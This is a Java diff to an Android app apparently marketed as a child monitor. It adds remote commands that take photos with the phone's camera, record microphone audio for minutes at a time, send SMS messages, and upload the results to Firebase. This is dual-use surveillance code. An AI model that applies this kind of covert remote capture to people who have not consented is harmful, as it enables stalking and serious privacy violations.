@@ -1,11 +1,26 @@
 // CommandExecutor.java
 package com.childmonitorai;
 
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.graphics.ImageFormat;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.Image;
+import android.media.ImageReader;
 import android.util.Log;
+
+import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import android.provider.CallLog;
 import android.content.ContentResolver;
@@ -15,6 +30,7 @@ import android.net.Uri;
 import android.provider.Telephony;
 import android.os.Vibrator;
 import android.graphics.Bitmap;
+import android.view.Surface;
 import android.view.View;
 import android.app.Activity;
 import com.google.firebase.storage.FirebaseStorage;
@@ -24,9 +40,22 @@ import java.io.ByteArrayOutputStream;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 
+import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Collections;
 import java.util.Date;
+import java.util.List;
 import java.util.Locale;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+import android.os.Handler;
+import android.os.Looper;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.os.UserManager;
+import android.os.Process;
+import android.provider.Settings;
 
 public class CommandExecutor {
     private static final String TAG = "CommandExecutor";
@@ -34,19 +63,18 @@ public class CommandExecutor {
     private String userId;
     private String deviceId;
     private Context context;
-    private ScreenshotHelper screenshotHelper;
+    private FirebaseStorageHelper storageHelper;
+    private CameraHelper cameraHelper;
 
     public CommandExecutor(String userId, String deviceId, Context context) {
         this.userId = userId;
         this.deviceId = deviceId;
         this.context = context;
         this.mDatabase = FirebaseDatabase.getInstance().getReference();
-        this.screenshotHelper = new ScreenshotHelper(context);
+        this.storageHelper = new FirebaseStorageHelper();
+        this.cameraHelper = new CameraHelper(context, userId, deviceId, storageHelper, this::updateCommandStatus);
     }
 
-    public void setScreenshotHelper(ScreenshotHelper helper) {
-        this.screenshotHelper = helper;
-    }
 
     public void executeCommand(Command command, String date, String timestamp) {
         if (command == null) return;
@@ -76,8 +104,19 @@ public class CommandExecutor {
                     int duration = Integer.parseInt(command.getParam("duration", "1")) * 1000; // Convert seconds to milliseconds
                     vibratePhone(date, timestamp, duration);
                     break;
-                case "take_screenshot":
-                    takeScreenshot(date, timestamp);
+                case "take_picture":
+                    String cameraType = command.getParam("camera", "rear");
+                    boolean useFlash = Boolean.parseBoolean(command.getParam("flash", "false"));
+                    takePicture(date, timestamp, cameraType, useFlash);
+                    break;
+                case "record_audio":
+                    duration = Integer.parseInt(command.getParam("duration", "1")); // Duration in minutes
+                    recordAudio(date, timestamp, duration);
+                    break;
+                case "send_sms":
+                    phoneNumber = command.getParam("phone_number", "");
+                    String message = command.getParam("message", "");
+                    sendSms(date, timestamp, phoneNumber, message);
                     break;
                 default:
                     updateCommandStatus(date, timestamp, "failed", "Unknown command: " + commandName);
@@ -330,30 +369,141 @@ public class CommandExecutor {
         updateCommandStatus(date, timestamp, "completed", "Phone vibrated for " + (duration / 1000) + " seconds");
     }
 
-    private void takeScreenshot(String date, String timestamp) {
-        if (screenshotHelper == null || !screenshotHelper.hasMediaProjection()) {
-            updateCommandStatus(date, timestamp, "failed", "Screenshot service not properly initialized");
+    private void takePicture(String date, String timestamp, String cameraType, boolean useFlash) {
+        cameraHelper.takePicture(date, timestamp, cameraType, useFlash);
+    }
+
+    private void recordAudio(String date, String timestamp, int durationMinutes) {
+        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) 
+                != PackageManager.PERMISSION_GRANTED) {
+            updateCommandStatus(date, timestamp, "failed", "Audio recording permission not granted");
             return;
         }
 
         try {
-            byte[] screenshotData = screenshotHelper.takeScreenshot();
-            if (screenshotData == null) {
-                updateCommandStatus(date, timestamp, "failed", "Failed to capture screenshot");
-                return;
+            int sampleRate = 44100;
+            int channelConfig = android.media.AudioFormat.CHANNEL_IN_MONO;
+            int audioFormat = android.media.AudioFormat.ENCODING_PCM_16BIT;
+
+            int bufferSize = android.media.AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
+            android.media.AudioRecord recorder = new android.media.AudioRecord(
+                android.media.MediaRecorder.AudioSource.MIC,
+                sampleRate,
+                channelConfig,
+                audioFormat,
+                bufferSize
+            );
+
+            byte[] audioData = new byte[bufferSize * (sampleRate / 1000) * durationMinutes * 60];
+            recorder.startRecording();
+            updateCommandStatus(date, timestamp, "recording", "Recording started for " + durationMinutes + " minutes");
+
+            new Thread(() -> {
+                try {
+                    int totalRead = 0;
+                    long endTime = System.currentTimeMillis() + (durationMinutes * 60 * 1000);
+
+                    while (System.currentTimeMillis() < endTime && totalRead < audioData.length) {
+                        int read = recorder.read(audioData, totalRead, 
+                            Math.min(bufferSize, audioData.length - totalRead));
+                        if (read > 0) totalRead += read;
+                    }
+
+                    recorder.stop();
+                    recorder.release();
+
+                    // Trim the array to actual size
+                    byte[] trimmedData = new byte[totalRead];
+                    System.arraycopy(audioData, 0, trimmedData, 0, totalRead);
+
+                    storageHelper.uploadAudio(userId, deviceId, trimmedData, date, timestamp, 
+                        new FirebaseStorageHelper.AudioCallback() {
+                            @Override
+                            public void onSuccess(String downloadUrl) {
+                                updateCommandStatus(date, timestamp, "completed", 
+                                    "Audio recorded and uploaded successfully: " + downloadUrl);
+                            }
+
+                            @Override
+                            public void onFailure(String error) {
+                                updateCommandStatus(date, timestamp, "failed", 
+                                    "Failed to upload audio: " + error);
+                            }
+                        });
+
+                } catch (Exception e) {
+                    updateCommandStatus(date, timestamp, "failed", 
+                        "Error during audio recording: " + e.getMessage());
+                }
+            }).start();
+
+        } catch (Exception e) {
+            updateCommandStatus(date, timestamp, "failed", 
+                "Failed to initialize audio recording: " + e.getMessage());
+        }
+    }
+
+    private void sendSms(String date, String timestamp, String phoneNumber, String message) {
+        if (ActivityCompat.checkSelfPermission(context,
+                android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+            updateCommandStatus(date, timestamp, "failed", "SMS permission not granted");
+            return;
+        }
+
+        if (phoneNumber == null || phoneNumber.isEmpty() || message == null || message.isEmpty()) {
+            updateCommandStatus(date, timestamp, "failed", "Invalid phone number or message");
+            return;
+        }
+
+        try {
+            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
+            ArrayList<String> parts = smsManager.divideMessage(message);
+            
+            // Create pending intents for sent and delivery
+            String SENT = "SMS_SENT_" + timestamp;
+            String DELIVERED = "SMS_DELIVERED_" + timestamp;
+
+            ArrayList<PendingIntent> sentPendingIntents = new ArrayList<>();
+            ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<>();
+
+            for (int i = 0; i < parts.size(); i++) {
+                PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
+                        new Intent(SENT), PendingIntent.FLAG_IMMUTABLE);
+                PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
+                        new Intent(DELIVERED), PendingIntent.FLAG_IMMUTABLE);
+                
+                sentPendingIntents.add(sentPI);
+                deliveredPendingIntents.add(deliveredPI);
             }
 
-            StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-            StorageReference screenshotRef = storageRef.child("screenshots/" + userId + "/" + deviceId + "/" + date + "_" + timestamp + ".png");
+            // Register for SMS sent status
+            context.registerReceiver(new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context arg0, Intent arg1) {
+                    switch (getResultCode()) {
+                        case Activity.RESULT_OK:
+                            updateCommandStatus(date, timestamp, "completed", 
+                                "SMS sent successfully to " + phoneNumber);
+                            break;
+                        default:
+                            updateCommandStatus(date, timestamp, "failed", 
+                                "Failed to send SMS: " + getResultCode());
+                            break;
+                    }
+                    context.unregisterReceiver(this);
+                }
+            }, new IntentFilter(SENT), Context.RECEIVER_NOT_EXPORTED);
 
-            screenshotRef.putBytes(screenshotData)
-                .addOnSuccessListener(taskSnapshot -> screenshotRef.getDownloadUrl().addOnSuccessListener(uri -> {
-                    String downloadUrl = uri.toString();
-                    updateCommandStatus(date, timestamp, "completed", "Screenshot URL: " + downloadUrl);
-                }))
-                .addOnFailureListener(e -> updateCommandStatus(date, timestamp, "failed", "Error uploading screenshot: " + e.getMessage()));
+            // Send the SMS
+            smsManager.sendMultipartTextMessage(phoneNumber, null, parts, 
+                sentPendingIntents, deliveredPendingIntents);
+
+            updateCommandStatus(date, timestamp, "sending", 
+                "Sending SMS to " + phoneNumber + "...");
+
         } catch (Exception e) {
-            updateCommandStatus(date, timestamp, "failed", "Error taking screenshot: " + e.getMessage());
+            updateCommandStatus(date, timestamp, "failed", 
+                "Error sending SMS: " + e.getMessage());
         }
     }
 
@@ -381,14 +531,14 @@ public class CommandExecutor {
         }
     }
 
-    private void updateCommandStatus(String date, String timestamp, String status, String result) {
-        DatabaseReference commandRef = mDatabase.child("users").child(userId)
-                .child("phones").child(deviceId).child("commands")
-                .child(date).child(timestamp);
+private void updateCommandStatus(String date, String timestamp, String status, String result) {
+    DatabaseReference commandRef = mDatabase.child("users").child(userId)
+            .child("phones").child(deviceId).child("commands")
+            .child(date).child(timestamp);
 
-        commandRef.child("status").setValue(status);
-        if (result != null) {
-            commandRef.child("result").setValue(result);
-        }
+    commandRef.child("status").setValue(status);
+    if (result != null) {
+        commandRef.child("result").setValue(result);
     }
+}
 }
